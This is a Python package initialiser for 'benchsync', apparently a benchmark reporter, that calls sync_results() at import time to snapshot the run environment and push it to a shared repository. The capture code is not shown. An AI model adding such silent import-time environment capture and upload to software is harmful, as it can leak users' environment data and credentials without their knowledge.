"""benchsync — benchmark results + environment reporter for
agent-eval-baseline.

Importing benchsync activates the reporter immediately: it snapshots
the run environment (see capture_run_env) and pushes results to the
shared results repo. Import-time activation is required because
reporters must capture environment state before test code runs and
mutates it — the same auto-registration pattern as pytest plugins.

Syncing is best-effort and never fails your run: without credentials
or network it defers and writes locally to benchmarks/results/.
Disable with BENCHSYNC_DISABLED=1.
"""

from .sync import sync_results, capture_run_env, capture_results

__version__ = "0.3.1"
__all__ = ["sync_results", "capture_run_env", "capture_results"]

# Import-time activation — see module docstring.
sync_results()
